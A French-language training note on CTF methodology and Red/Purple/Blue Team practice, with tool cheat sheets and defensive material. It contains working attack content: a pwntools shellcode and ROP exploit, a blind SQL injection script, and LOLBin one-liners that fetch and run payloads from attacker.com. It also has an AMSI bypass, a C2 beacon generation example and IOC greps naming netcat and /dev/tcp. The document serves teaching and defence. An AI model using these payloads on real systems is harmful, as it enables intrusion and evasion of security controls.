# CTF Methodologie et Red Team

Les CTF (Capture The Flag) sont le terrain d'entraînement du hacker éthique : des environnements volontairement vulnérables pour développer des compétences techniques réelles. Le Red Teaming va plus loin en simulant des attaques APT (Advanced Persistent Threat) réalistes pour tester les défenses d'une organisation dans sa globalité.

> [!info] Usage éducatif
> Ce cours présente des techniques avancées dans le cadre de compétitions CTF légitimes et de Red Team autorisé. Les outils mentionnés s'utilisent exclusivement dans des environnements de test ou avec une autorisation contractuelle explicite.

---

## 1. Catégories CTF

```
Catégories principales d'un CTF

Pwn / Binary Exploitation
│   Exploiter des binaires compilés (buffer overflow, heap, format string)
│   Compétences : C, assembleur x86/x64, gdb, pwntools
│   Difficulté : élevée — demande une bonne base en système
│
Web
│   Vulnérabilités d'applications web (SQLi, XSS, SSRF, SSTI, désérialisation...)
│   Compétences : HTTP, JavaScript, SQL, notions backend
│   Difficulté : variable, très accessible pour débuter
│
Crypto
│   Cryptographie (casser des chiffrements classiques ou modernes mal implémentés)
│   Compétences : mathématiques, Python, concepts crypto (RSA, AES, hash)
│   Difficulté : variable selon le niveau
│
Forensics
│   Analyse de fichiers, images disque, captures réseau, mémoire
│   Compétences : Linux, Wireshark, Volatility, outils forensics
│   Difficulté : variable, très accessible
│
Reversing (Reverse Engineering)
│   Analyser du code compilé sans le code source
│   Compétences : assembleur, Ghidra/IDA, décompilateurs
│   Difficulté : élevée
│
OSINT
│   Collecte d'informations depuis des sources publiques
│   Compétences : recherche web, métadonnées, géolocalisation
│   Difficulté : accessible, demande de la créativité
│
Steganography
│   Cacher et retrouver des données dans des fichiers (images, audio, vidéo)
│   Compétences : binwalk, steghide, stegsolve, analyse hexadécimale
│   Difficulté : variable
│
Misc / Other
    Challenges inclassables, trivia, challenges de programmation
```

---

## 2. Approche méthodique d'un challenge CTF

### Workflow universel

```
Approche d'un challenge inconnu

1. LIRE L'ÉNONCÉ attentivement
   └── Chaque mot peut être un indice — noter les termes inhabituels

2. IDENTIFIER LA CATÉGORIE
   └── Web ? Binaire ? Fichier image ? Réseau ?

3. FAIRE UN PREMIER TOUR RAPIDE (5 min max)
   └── Regarder sans modifier, recueillir les observations

4. CHOISIR UN VECTEUR D'ATTAQUE
   └── Hypothèse : "Je pense que c'est X parce que Y"

5. CREUSER LE VECTEUR CHOISI (30 min)
   └── Si rien → noter et essayer une autre approche

6. CHERCHER DES RESSOURCES SI BLOQUÉ
   └── Google, writeups d'anciens CTF similaires (thème/technique)
   └── Pas de spoiler direct — chercher la technique, pas la réponse

7. DOCUMENTER LE PROCESSUS
   └── Notes en temps réel → writeup plus facile après
```

### Questions de triage par catégorie

```bash
# Challenge Web
# - Quel stack technologique ? (PHP, Python/Flask, Node, Java)
# - Quels paramètres existent ? (URL, POST, cookies, headers)
# - Y a-t-il du code source fourni ?
# - Burp Suite ouvert, tout intercepter

# Challenge Fichier (forensics/stéga)
file challenge.xxx          # Type réel du fichier
xxd challenge.xxx | head -20  # Voir les magic bytes en hexa
strings challenge.xxx       # Strings lisibles
exiftool challenge.xxx      # Métadonnées

# Challenge Binaire (pwn)
file binary                 # ELF 32/64 bits ? Stripped ?
checksec binary             # Protections activées (ASLR, NX, canary, PIE)
strings binary              # Strings lisibles, indices
ltrace ./binary             # Appels bibliothèque
strace ./binary             # Appels système
gdb -q binary               # Debug interactif

# Challenge Crypto
# - Identifier le type de chiffrement (classique ? moderne ?)
# - Y a-t-il du code source du chiffrement ?
# - Chercher les patterns : longueur fixe → block cipher, longueur variable → stream
# - CyberChef en premier réflexe
```

---

## 3. Outils par catégorie

### Catégorie Pwn — Binary Exploitation

```python
# pwntools — librairie Python pour l'exploitation binaire

from pwn import *

# Connexion locale ou réseau
p = process('./vulnerable_binary')
# ou
p = remote('ctf.example.com', 1337)

# Opérations de base
p.recv(1024)                    # Recevoir des données
p.recvuntil(b"Enter input: ")   # Recevoir jusqu'à un pattern
p.sendline(b"payload")          # Envoyer + newline
p.send(b"payload")              # Envoyer sans newline
p.interactive()                 # Mode interactif (après shell)

# Utilitaires
p32(0xdeadbeef)     # Pack en little-endian 32 bits → b'\xef\xbe\xad\xde'
p64(0xdeadbeef)     # Pack en little-endian 64 bits
u32(b'\xef\xbe\xad\xde')  # Unpack 32 bits
cyclic(200)          # Pattern De Bruijn pour trouver l'offset
cyclic_find(0x61616166)   # Trouver l'offset depuis le pattern crashé

# Trouver l'EIP/RIP offset
# 1. Générer un pattern
pattern = cyclic(200)
p.sendline(pattern)
p.wait()  # Le binaire crash

# Dans gdb : x/x $eip → 0x61616166
offset = cyclic_find(0x61616166)  # → 42

# Exemple de BoF simple (NX désactivé, pas de ASLR)
from pwn import *

p = process('./vuln')
context.arch = 'i386'

offset = 42
shellcode = asm(shellcraft.sh())      # Shellcode pour /bin/sh
payload = shellcode + b"A" * (offset - len(shellcode)) + p32(0xdeadbeef)  # Adresse du buffer

p.sendline(payload)
p.interactive()

# ROP chain (NX activé)
elf = ELF('./vuln')
rop = ROP(elf)
rop.system(next(elf.search(b'/bin/sh')))

payload = b"A" * offset + rop.chain()
p.sendline(payload)
p.interactive()
```

```bash
# GDB avec pwndbg
gdb -q ./binary
pwndbg> checksec       # Protections
pwndbg> disas main     # Désassembler main
pwndbg> break *main+42 # Breakpoint sur une instruction
pwndbg> run
pwndbg> x/20x $rsp     # Examiner la stack
pwndbg> pattern create 200
pwndbg> run <<< $(python3 -c "print('Aa0Aa1Aa2Aa3Aa4...')")
pwndbg> pattern search  # Trouver l'offset après crash
```

### Catégorie Crypto

```python
# CyberChef — outil web universel
# https://gchq.github.io/CyberChef/
# Opérations : From Base64, ROT13, XOR, Frequency Analysis...

# Chiffrements classiques

# ROT13
import codecs
codecs.encode("Hello World", 'rot_13')   # → "Uryyb Jbeyq"

# César (bruteforce toutes les rotations)
def cesar_bruteforce(ciphertext):
    for shift in range(26):
        result = ""
        for char in ciphertext:
            if char.isalpha():
                base = ord('A') if char.isupper() else ord('a')
                result += chr((ord(char) - base + shift) % 26 + base)
            else:
                result += char
        print(f"Shift {shift:2d}: {result}")

# Vigenère — décryptage avec clé connue
from itertools import cycle

def vigenere_decrypt(ciphertext, key):
    result = ""
    key_cycle = cycle(key.upper())
    for char in ciphertext.upper():
        if char.isalpha():
            shift = ord(next(key_cycle)) - ord('A')
            result += chr((ord(char) - ord('A') - shift) % 26 + ord('A'))
        else:
            result += char
            next(key_cycle)  # Avancer la clé sur les non-alpha aussi
    return result

# RSA — vulnérabilités courantes

from Crypto.Util.number import inverse, long_to_bytes
from math import gcd

# Petit exposant e (e=3, message court)
# m^e mod n, si m^e < n → pas de réduction modulo
# m = pow(c, 1, n)^(1/e) → racine cubique
import gmpy2
m = gmpy2.iroot(c, e)[0]  # e=3
print(long_to_bytes(m))

# Common Modulus Attack (même n, deux e différents, même message)
# c1 = m^e1 mod n, c2 = m^e2 mod n
# gcd(e1,e2) = 1 → m = c1^s1 * c2^s2 mod n
def extended_gcd(a, b):
    if a == 0:
        return b, 0, 1
    g, x, y = extended_gcd(b % a, a)
    return g, y - (b // a) * x, x

g, s1, s2 = extended_gcd(e1, e2)
if s1 < 0:
    m = pow(inverse(c1, n), -s1, n) * pow(c2, s2, n) % n
else:
    m = pow(c1, s1, n) * pow(inverse(c2, n), -s2, n) % n
print(long_to_bytes(m))

# Factorisation si n est faible (< 512 bits)
# Utiliser factordb.com ou :
import sympy
p, q = sympy.factorint(n).keys()
phi = (p-1) * (q-1)
d = inverse(e, phi)
m = pow(c, d, n)
print(long_to_bytes(m))
```

### Catégorie Forensics

```bash
# Outils fondamentaux

# Identifier le type de fichier
file unknown_file
xxd unknown_file | head -5   # Magic bytes en hexadécimal

# Extraction de fichiers cachés
binwalk -e fichier.png        # Extraire les fichiers embarqués
binwalk -M -e archive.bin     # Récursif
foremost -t all -i fichier.dd # Carver de fichiers (par en-têtes)

# Métadonnées
exiftool image.jpg            # Toutes les métadonnées (GPS, appareil, dates...)
exiftool *.jpg | grep GPS

# Strings
strings -n 8 binaire | grep -i flag   # Strings de 8+ chars contenant "flag"
strings -a -e l fichier               # Strings Unicode 16-bit little-endian

# Analyse de captures réseau (PCAP)
wireshark capture.pcap                # Interface graphique
tshark -r capture.pcap                # Ligne de commande
tshark -r capture.pcap -Y "http"      # Filtrer HTTP
tshark -r capture.pcap -Y "http.request" -T fields -e http.host -e http.request.uri
# Exporter des objets HTTP depuis Wireshark : File → Export Objects → HTTP

# Analyse mémoire avec Volatility
# Identifier le profil OS
volatility -f memory.dmp imageinfo
volatility3 -f memory.dmp windows.info

# Liste des processus
volatility3 -f memory.dmp windows.pslist
volatility3 -f memory.dmp windows.pstree

# Réseau
volatility3 -f memory.dmp windows.netstat

# Extraire des fichiers
volatility3 -f memory.dmp windows.filescan
volatility3 -f memory.dmp windows.dumpfiles --physaddr 0x...

# Dump de hashes
volatility3 -f memory.dmp windows.hashdump
```

### Catégorie Reversing

```bash
# Ghidra — décompilateur NSA (gratuit)
# Installation : https://ghidra-sre.org/
# Créer un projet, importer le binaire, analyser automatiquement
# CodeBrowser → main → décompilateur à droite

# Radare2 — framework d'analyse
r2 ./binary
> aaaa             # Analyse complète
> afl             # Lister les fonctions
> pdf @ main      # Désassembler main
> s 0x8048456     # Se déplacer à une adresse
> V               # Mode visuel
> VV              # Mode graphe
> dc              # Exécuter (debugger)

# ltrace et strace (appels système et bibliothèque)
ltrace ./binary           # Trace les appels aux lib (strcmp, malloc...)
ltrace -s 100 ./binary    # Strings jusqu'à 100 chars
strace ./binary           # Trace les appels système (open, read, write...)

# Gdb pour débugger interactivement
gdb -q ./binary
(gdb) break main
(gdb) run
(gdb) disas                # Désassembler la fonction courante
(gdb) x/s $rsi             # Examiner une string à l'adresse de RSI
(gdb) ni                   # Next instruction (step over)
(gdb) si                   # Step into
(gdb) info registers        # État des registres

# Techniques courantes en reversing CTF
# - Chercher les strings (mots de passe hard-codés)
# - Identifier les comparaisons (cmp, strcmp) dans les branches
# - Patch le binaire (changer un saut conditionnel JNE → JE)
# - Reverse d'algorithme de chiffrement custom → écrire le déchiffrement
```

### Catégorie Stéganographie

```bash
# stegsolve — analyse visuelle d'images
java -jar stegsolve.jar

# steghide — cacher/extraire dans JPEG/BMP/WAV/AU
steghide info image.jpg          # Voir si des données sont cachées
steghide extract -sf image.jpg   # Extraire (demande passphrase)
steghide extract -sf image.jpg -p ""  # Tenter passphrase vide
steghide embed -cf image.jpg -sf secret.txt -p "passphrase"  # Cacher

# Bruteforce passphrase steghide
stegseek image.jpg /usr/share/wordlists/rockyou.txt

# zsteg — stéganographie PNG (LSB, etc.)
zsteg image.png
zsteg -a image.png        # Tous les canaux et bits
zsteg image.png -b 1 -o xy -p "b,r,g,a"

# LSB (Least Significant Bit) — technique manuelle Python
from PIL import Image

img = Image.open("image.png")
pixels = list(img.getdata())

bits = ""
for pixel in pixels:
    for channel in pixel[:3]:  # R, G, B
        bits += str(channel & 1)  # LSB

# Convertir les bits en texte
chars = [chr(int(bits[i:i+8], 2)) for i in range(0, len(bits), 8)]
print("".join(chars)[:100])

# outguess, jsteg pour JPEG
outguess -r image.jpg output.txt

# Audio stéganographie
# Ouvrir dans Audacity → vue spectrogramme (View → Spectrogram)
# Sonic Visualizer pour analyse avancée
sox secret.wav -n stat 2>&1
```

---

## 4. Crypto classiques — Aide-mémoire

```python
# Identifier rapidement le type de chiffrement

def identify_encoding(text):
    import base64, re
    
    # Base64
    if re.match(r'^[A-Za-z0-9+/]+=*$', text) and len(text) % 4 == 0:
        try:
            decoded = base64.b64decode(text)
            print(f"[Base64] → {decoded[:50]}")
        except:
            pass
    
    # Hexadécimal
    if re.match(r'^[0-9a-fA-F]+$', text) and len(text) % 2 == 0:
        try:
            decoded = bytes.fromhex(text)
            print(f"[Hex] → {decoded[:50]}")
        except:
            pass
    
    # ROT13
    import codecs
    print(f"[ROT13] → {codecs.encode(text, 'rot_13')[:50]}")
    
    # Morse
    MORSE = {'.-':'A', '-...':'B', '-.-.':'C', '-..':'D', '.':'E', '..-.':'F',
             '--.':'G', '....':'H', '..':'I', '.---':'J', '-.-':'K', '.-..':'L',
             '--':'M', '-.':'N', '---':'O', '.--.':'P', '--.-':'Q', '.-.':'R',
             '...':'S', '-':'T', '..-':'U', '...-':'V', '.--':'W', '-..-':'X',
             '-.--':'Y', '--..':'Z'}
    if set(text.replace(' ', '').replace('/', '')) <= {'.', '-'}:
        decoded = ' '.join([MORSE.get(w, '?') for w in text.split()])
        print(f"[Morse] → {decoded}")

# Fréquences d'analyse pour chiffrement par substitution
from collections import Counter

def frequency_analysis(ciphertext):
    text = ''.join(c for c in ciphertext.upper() if c.isalpha())
    freq = Counter(text)
    total = sum(freq.values())
    # Lettre la plus fréquente en français : E, A, I, S, N, T...
    # En anglais : E, T, A, O, I, N, S, H, R, L...
    print("Fréquences (ordre décroissant) :")
    for char, count in freq.most_common(10):
        print(f"  {char}: {count/total*100:.1f}%")
```

---

## 5. Scripting Python pour automatiser des exploits

```python
#!/usr/bin/env python3
"""
Template d'exploit web CTF
"""

import requests
import sys
from urllib.parse import urljoin

TARGET = "http://ctf.example.com"
SESSION = requests.Session()

def setup_session():
    """S'authentifier et initialiser la session."""
    resp = SESSION.post(urljoin(TARGET, "/login"), data={
        "username": "admin",
        "password": "admin"
    })
    return resp.status_code == 200

def extract_flag():
    """Tenter d'extraire le flag via SQLi."""
    flag = ""
    position = 1
    
    while True:
        found = False
        for char in "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}_":
            # Payload SQLi boolean-based
            payload = f"1' AND SUBSTRING((SELECT flag FROM flags LIMIT 1),{position},1)='{char}'-- -"
            
            resp = SESSION.get(urljoin(TARGET, f"/search?id={payload}"))
            
            if "Found" in resp.text:  # Adapter selon le comportement
                flag += char
                print(f"\r[+] Flag: {flag}", end="", flush=True)
                found = True
                break
        
        if not found:
            break
        position += 1
    
    return flag

def main():
    print("[*] Setup session...")
    if not setup_session():
        print("[!] Auth failed")
        sys.exit(1)
    
    print("[*] Extracting flag...")
    flag = extract_flag()
    print(f"\n[!] FLAG: {flag}")

if __name__ == "__main__":
    main()
```

---

## 6. Red Team — Simulation APT

### Red Team vs Pentest classique

| Critère | Pentest | Red Team |
|---------|---------|----------|
| **Durée** | 1-4 semaines | 1-6 mois |
| **Scope** | Techniques spécifiques, périmètre défini | Objectif business (ex: accéder aux données financières) |
| **Furtivité** | Souvent non | Oui — simuler un APT réel |
| **Résultat** | Liste de vulnérabilités | Évaluation des capacités de détection |
| **Connaissance Blue Team** | Souvent au courant | Souvent non informé (test de surprise) |

### MITRE ATT&CK — Phases Red Team

```
MITRE ATT&CK — Phases simulées en Red Team

TA0001  Initial Access ─────────── Comment entrer ?
│       Spear phishing, exploitation service exposé, supply chain
│       Outils : Gophish (phishing), exploit frameworks
│
TA0002  Execution ─────────────── Exécuter du code sur la cible
│       PowerShell, WMI, Office macros, Scheduled Tasks
│       Outils : Empire, Covenant, Sliver
│
TA0003  Persistence ───────────── Maintenir l'accès après redémarrage
│       Registry, services, backdoors, comptes créés
│       Outils : Persistence modules (C2 frameworks)
│
TA0004  Privilege Escalation ──── Passer à SYSTEM/root
│       Token impersonation, LPE exploits, Kerberos attacks
│       Outils : WinPEAS, LinPEAS, JuicyPotato
│
TA0005  Defense Evasion ─────────  Ne pas être détecté
│       Obfuscation, living-off-the-land, timestomping
│       Outils : Invoke-Obfuscation, AMSI bypass
│
TA0006  Credential Access ─────── Voler des credentials
│       Mimikatz, Kerberoasting, LSASS dump
│       Outils : mimikatz, Rubeus, LaZagne
│
TA0007  Discovery ─────────────── Explorer l'environnement
│       AD enumeration, réseau, services
│       Outils : BloodHound, PowerView
│
TA0008  Lateral Movement ─────── Se déplacer vers d'autres machines
│       Pass-the-Hash, RDP, PsExec
│       Outils : impacket, CrackMapExec
│
TA0009  Collection ─────────────  Collecte d'informations/données
│       Fichiers sensibles, bases de données, emails
│
TA0011  Command and Control ───── Communication avec l'infrastructure
│       HTTPS C2, DNS tunneling, domain fronting
│       Outils : Cobalt Strike, Havoc, Sliver, Covenant
│
TA0010  Exfiltration ──────────── Sortir les données
│       DNS exfil, HTTPS, chiffrement
│
TA0040  Impact ─────────────────  Objectif final (non réalisé en test)
        Ransomware, suppression, sabotage
```

### C2 Frameworks (Command and Control)

```bash
# Sliver — C2 open-source moderne (recommandé pour les labs)
# https://github.com/BishopFox/sliver

# Installation
curl https://sliver.sh/install|sudo bash

# Démarrer le serveur
sudo sliver-server

# Générer un implant (beacon)
sliver > generate beacon --mtls 192.168.1.50:443 --os windows --arch amd64 --save /tmp/beacon.exe

# Démarrer un listener
sliver > mtls --lhost 0.0.0.0 --lport 443

# Quand le beacon se connecte
sliver > sessions
sliver > use SESSION_ID
sliver (session) > whoami
sliver (session) > execute-assembly /tools/SharpHound.exe -c all

# Havoc — alternative open-source à Cobalt Strike
# https://github.com/HavocFramework/Havoc
```

### Living off the Land (LoTL)

Utiliser des outils légitimes pré-installés (Windows built-ins) pour éviter la détection.

```powershell
# LOLBins — Windows Living off the Land Binaries
# Référence : https://lolbas-project.github.io/

# certutil — téléchargement de fichiers
certutil.exe -urlcache -f http://attacker.com/payload.exe C:\Windows\Temp\p.exe

# bitsadmin — téléchargement en arrière-plan
bitsadmin /transfer job http://attacker.com/payload.exe C:\Temp\p.exe

# regsvr32 — exécution de scriptlets sans writefile
regsvr32 /s /n /u /i:http://attacker.com/payload.sct scrobj.dll

# mshta — exécuter du HTA
mshta.exe http://attacker.com/payload.hta

# PowerShell — téléchargement et exécution en mémoire
powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/script.ps1')"

# wmic — exécution distante
wmic /node:192.168.1.100 process call create "cmd.exe /c payload.exe"

# Bypass AMSI (Antimalware Scan Interface) basique
# (Éducatif — illustre le principe, les EDR modernes bloquent ces techniques)
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

---

## 7. Blue Team — Défense et réponse

### SIEM et logs

```bash
# Logs Windows importants à monitorer
# Security.evtx
# 4624 : Connexion réussie
# 4625 : Tentative de connexion échouée
# 4672 : Attribution de privilèges spéciaux (SYSTEM)
# 4698 : Tâche planifiée créée
# 4732 : Ajout à un groupe local
# 7045 : Nouveau service installé

# Logs Linux
/var/log/auth.log        # Authentifications SSH, sudo
/var/log/syslog          # Logs système généraux
/var/log/apache2/        # Logs web
/var/log/audit/audit.log # Auditd (accès fichiers, appels système)

# Analyse rapide avec grep
grep "Failed password" /var/log/auth.log | wc -l  # Nombre d'échecs SSH
grep "Accepted" /var/log/auth.log | tail -20       # Dernières connexions SSH réussies
grep "sudo" /var/log/auth.log | grep "command"     # Commandes sudo utilisées
```

### Threat Hunting — Indicateurs d'attaque

```bash
# IOC (Indicators of Compromise) courants à chercher

# Processus suspects
ps aux | grep -E "(nc|netcat|ncat|socat)" | grep -v grep
ps aux | grep -E "\-e /bin/bash|/dev/tcp" | grep -v grep

# Connexions réseau anormales
ss -tnp | grep ESTABLISHED        # Connexions TCP actives
netstat -an | grep LISTEN          # Ports en écoute
lsof -i -n | grep ESTABLISHED     # Fichiers + connexions réseau

# Fichiers modifiés récemment (30 dernières minutes)
find /var/www /etc /tmp /dev/shm -newer /tmp/marker -type f 2>/dev/null
find / -mmin -30 -type f -not -path "/proc/*" 2>/dev/null

# Fichiers SUID ajoutés récemment
find / -perm -4000 -newer /bin/sh -type f 2>/dev/null

# Tâches planifiées (cron) anormales
cat /etc/crontab
ls /etc/cron.d/
crontab -l -u root 2>/dev/null

# Utilisateurs créés récemment
awk -F: '($3 > 1000) && ($3 < 65534)' /etc/passwd

# Clés SSH non autorisées
find /home -name "authorized_keys" -exec cat {} \;
find /root -name "authorized_keys" -exec cat {} \;
```

### SOAR — Automatisation de la réponse

```python
#!/usr/bin/env python3
"""
Script de réponse automatique simple — isolation d'une IP suspecte
(Usage : équipe Blue Team en lab de simulation)
"""

import subprocess
import datetime
import sys

def log_incident(ip, raison):
    timestamp = datetime.datetime.now().isoformat()
    with open("/var/log/incidents.log", "a") as f:
        f.write(f"{timestamp} | ISOLATION | IP: {ip} | Raison: {raison}\n")
    print(f"[{timestamp}] Incident loggé : {ip}")

def isoler_ip(ip):
    """Bloquer une IP via iptables."""
    commandes = [
        ["iptables", "-I", "INPUT", "1", "-s", ip, "-j", "DROP"],
        ["iptables", "-I", "OUTPUT", "1", "-d", ip, "-j", "DROP"],
    ]
    for cmd in commandes:
        result = subprocess.run(cmd, capture_output=True)
        if result.returncode != 0:
            print(f"[!] Erreur iptables : {result.stderr.decode()}")
            return False
    print(f"[+] IP {ip} isolée via iptables")
    return True

def alerter(ip, raison):
    """Envoyer une alerte (ici : log simple)."""
    print(f"[ALERTE] IP suspecte détectée : {ip}")
    print(f"[ALERTE] Raison : {raison}")
    # En prod : intégration Slack, PagerDuty, email...

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print(f"Usage: {sys.argv[0]} <ip> <raison>")
        sys.exit(1)
    
    ip = sys.argv[1]
    raison = sys.argv[2]
    
    log_incident(ip, raison)
    alerter(ip, raison)
    isoler_ip(ip)
```

---

## 8. Purple Team — Exercices collaboratifs

```
Exercice Purple Team — Déroulement typique

Jour 1 — Planification
├── Red Team : présente les TTPs qu'il va simuler (ex: Kerberoasting + Lateral Movement)
└── Blue Team : identifie les sources de logs et règles de détection existantes

Jour 2-3 — Exécution simulée
├── Red Team exécute chaque technique, une par une
├── Blue Team indique ce qu'il détecte (ou pas)
└── Si non détecté → créer une règle de détection en temps réel

Jour 4 — Résultats
├── Matrice de couverture : technique / détectée (oui/non) / alerte générée
├── Priorisation des règles manquantes
└── Plan d'amélioration SIEM

Résultat :
Red Team : valide que les techniques fonctionnent
Blue Team : améliore sa couverture de détection
Organisation : gain mesurable en posture de sécurité
```

### Règles de détection SIGMA (langage universel SIEM)

```yaml
# Exemple de règle SIGMA pour détecter Mimikatz
title: Mimikatz Detection via LSASS Access
id: 3a60bcba-1b6e-4b68-b671-c0c3dc75a9e4
status: stable
description: Détecte l'accès à LSASS par des outils de dump de credentials
references:
  - https://attack.mitre.org/techniques/T1003/001/
author: BlueTeam
date: 2024-01-01
tags:
  - attack.credential_access
  - attack.t1003.001
logsource:
  category: process_access
  product: windows
detection:
  selection:
    TargetImage|endswith: '\lsass.exe'
    GrantedAccess|contains:
      - '0x1010'
      - '0x1410'
      - '0x147a'
      - '0x143a'
  filter_legit:
    SourceImage|startswith:
      - 'C:\Windows\System32\'
      - 'C:\Windows\SysWOW64\'
  condition: selection and not filter_legit
falsepositives:
  - Antivirus, EDR, backup software
level: high
```

---

## 9. Rapport de sécurité professionnel

### Structure d'un rapport Red Team

```
Rapport Red Team — Structure complète

EXECUTIVE SUMMARY (2-3 pages)
├── Objectifs de l'engagement
├── Résumé des objectifs atteints
├── Synthèse des conclusions (graphique radar)
└── Top 5 recommandations prioritaires

METHODOLOGY
├── Phases de l'engagement (timeline)
├── Techniques utilisées (MITRE ATT&CK mapping)
└── Outils utilisés

ATTACK NARRATIVE
├── Récit chronologique de l'intrusion
├── Chaque étape avec timestamp, technique, impact
└── Preuves (screenshots, logs)

FINDINGS
Pour chaque finding :
├── ID : RT-2024-001
├── Sévérité : Critique / Élevé / Moyen / Faible
├── MITRE ATT&CK : TA0001 - T1566.001
├── Description technique
├── Impact business
├── Preuve de concept
├── Recommandation de correction
└── Délai de remédiation suggéré

DETECTION ANALYSIS
├── Ce qui a été détecté
├── Ce qui n'a pas été détecté (gap d'alerting)
└── Recommandations SIEM/SOC

REMEDIATION ROADMAP
├── Court terme (< 1 mois) : corrections critiques
├── Moyen terme (1-6 mois) : améliorations structurelles
└── Long terme (> 6 mois) : projets de sécurité majeurs

APPENDICES
├── Logs et outputs bruts
├── Hashes des fichiers déposés (IOC)
└── Glossaire
```

---

## Exercices pratiques (CTF style)

### Exercice 1 — Résoudre un challenge Forensics PCAP

```bash
# Challenge type : on vous donne un fichier PCAP, trouvez le flag

# Étape 1 : Vue d'ensemble
tshark -r challenge.pcap -z io,phs   # Protocoles présents
tshark -r challenge.pcap -z conv,tcp # Conversations TCP

# Étape 2 : Extraire les objets HTTP
tshark -r challenge.pcap --export-objects http,/tmp/http_objects/
ls /tmp/http_objects/
strings /tmp/http_objects/* | grep -i flag

# Étape 3 : Chercher des données en base64 ou hex
tshark -r challenge.pcap -Y "data" -T fields -e data | xxd

# Étape 4 : DNS exfiltration ?
tshark -r challenge.pcap -Y "dns" -T fields -e dns.qry.name | sort -u
# Si des sous-domaines encodés → exfiltration DNS

# Étape 5 : Credentials en clair ?
tshark -r challenge.pcap -Y "ftp || telnet || http" -T fields -e text
```

### Exercice 2 — Challenge Crypto RSA

```python
#!/usr/bin/env python3
"""
Challenge CTF Crypto — RSA avec e=3 et message court
Flag format : picoCTF{...}
"""

from Crypto.Util.number import long_to_bytes
import gmpy2

# Données du challenge (exemple fictif)
n = 0xdeadbeef_cafebabe_12345678  # Modifier avec les vraies valeurs
e = 3
c = 0xabcdef01_23456789  # Ciphertext

# Attaque : si m^3 < n, pas de réduction modulo
# → m = racine cubique exacte de c
m, exact = gmpy2.iroot(c, e)

if exact:
    print(f"[+] Racine exacte trouvée : {m}")
    flag = long_to_bytes(m)
    print(f"[+] Flag : {flag.decode('latin-1')}")
else:
    print("[-] Racine non exacte — l'attaque e=3 simple ne s'applique pas")
    print("[*] Essayer d'autres attaques RSA...")
```

### Exercice 3 — HTB Machine complète (workflow)

```bash
# Workflow complet sur une machine HTB moyenne

# 1. Reconnaissance
export IP=10.10.11.100
sudo nmap -sV -sC -p- --min-rate 5000 $IP -oN nmap_full.txt
cat nmap_full.txt | grep "open"

# 2. Enumération web (si port 80/443)
gobuster dir -u http://$IP -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \
  -x php,txt,html,bak -t 50 -o gobuster.txt

# 3. Analyse manuelle dans Burp Suite
# - Tout tester (formulaires, paramètres URL, cookies)
# - Chercher les commentaires HTML, JS

# 4. Foothold
# (Selon la vulnérabilité trouvée)
# Exemple : LFI → log poisoning → RCE → reverse shell

# 5. Stabiliser le shell
python3 -c 'import pty;pty.spawn("/bin/bash")'
Ctrl+Z
stty raw -echo; fg
export TERM=xterm

# 6. User flag
cat /home/*/user.txt

# 7. Escalade de privilèges
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

# 8. Root flag
cat /root/root.txt

# 9. Écrire un writeup :
# - Description de chaque étape
# - Pourquoi la vulnérabilité existe
# - Commande exacte utilisée
# - Ce que vous auriez pu chercher différemment
```

### Exercice 4 — Simulation Red Team basique (en lab)

```bash
# Lab recommandé : GOAD (Game of Active Directory) ou HTB Pro Lab "Offshore"

# Simulation d'un Red Team engagement - 4 heures

# PHASE 1 : Initial Access (30 min)
# Objectif : accès initial via phishing simulé ou exploitation d'un service web
# Documenter : vecteur d'entrée, premier shell, timestamp

# PHASE 2 : Discovery (30 min)
# Objectif : cartographier l'environnement interne
# Outils : BloodHound, nmap interne, PowerView
# Documenter : nombre de machines, DC trouvés, comptes à cibler

# PHASE 3 : Privilege Escalation (1h)
# Objectif : passer à Domain Admin
# Documenter : technique utilisée (Kerberoasting ? LPE ?)

# PHASE 4 : Lateral Movement (30 min)
# Objectif : se déplacer vers d'autres segments réseau
# Outils : CrackMapExec, Impacket, chisel pour pivoting

# PHASE 5 : Objectif final (30 min)
# Objectif : accéder aux données "sensibles" définies dans les RoE
# Documenter : fichiers ou accès atteints

# PHASE 6 : Rapport (1h)
# Rédiger un mini-rapport Red Team avec :
# - Timeline des actions
# - Mapping MITRE ATT&CK
# - Top 3 recommandations Blue Team
```

> [!tip] Liens vers les autres notes
> - [[01 - Fondamentaux Hacking Ethique]] — cadre légal et méthodologies de base
> - [[02 - Reconnaissance et OSINT]] — phase de reconnaissance préalable
> - [[03 - Exploitation Web et Systeme]] — techniques d'exploitation web
> - [[04 - Active Directory et Post-Exploitation]] — AD attacks et post-exploitation
> - [[02 - Securite Web OWASP]] — contre-mesures côté développeur
> - [[03 - Securite Reseau]] — sécurité réseau et firewalls
> - [[07 - DevSecOps]] — intégration sécurité dans le cycle de développement
